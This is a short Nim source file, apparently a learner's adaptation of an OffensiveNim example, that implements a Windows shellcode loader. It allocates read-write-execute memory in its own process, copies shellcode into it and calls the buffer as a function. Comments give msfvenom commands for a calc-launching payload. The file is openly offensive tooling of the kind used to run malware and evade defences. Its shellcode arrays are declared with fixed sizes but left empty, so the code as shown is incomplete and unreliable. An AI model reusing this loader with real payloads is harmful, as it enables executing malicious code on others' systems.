#[
  Reference: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/dynamic_shellcode_local_inject_bin.nim  

  - Define shellcode based on computer architecture
  - Get handle on the current process
  - Allocate memory in that process and copy shellcode to it
  - Run shellcode by casting the shellcode pointer as a proc (basically a function)
    - I think this means that calling this variable then runs whatever code is at the pointer as if it were a function, thus running the shellcode


]#

import winim
import winim/lean

proc innerMain(shellcode: ptr, size: int): void =
  let tProcess = GetCurrentProcessId()
  var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)

  let rPtr = VirtualAllocEx(
    pHandle,
    NULL,
    cast[SIZE_T](size),
    MEM_COMMIT,
    PAGE_EXECUTE_READ_WRITE
  )

  copyMem(rPtr, shellcode, size)
  # Not exactly sure what this does, but it calls the allocated shellcode buffer
  let f = cast[proc(){.nimcall.}](rPtr)
  f()

when defined(windows):

  # If 32-bit process
  when defined(i386):
    # msfvenom -p windows/exec cmd="calc" -f csharp
    # Works to pop calc, but fails on MessageBox for some reason
    echo "[*] Running in x86 process"
    const sc_length: int = 189
    var shellcode: array[189, byte] = [
    byte ]

  # If 64-bit process
  elif defined(amd64):
    # msfvenom -p windows/x64/exec cmd="calc" -f csharp
    # Works to pop calc, but fails on MessageBox for some reason
    echo "[*] Running in x64 process"
    const sc_length: int = 272
    var shellcode: array[272, byte] = [
    byte ]

  when isMainModule:

    var shellcodePtr = (cast[ptr array[sc_length, byte]](addr shellcode[0]))
    innerMain(shellcodePtr, len(shellcode))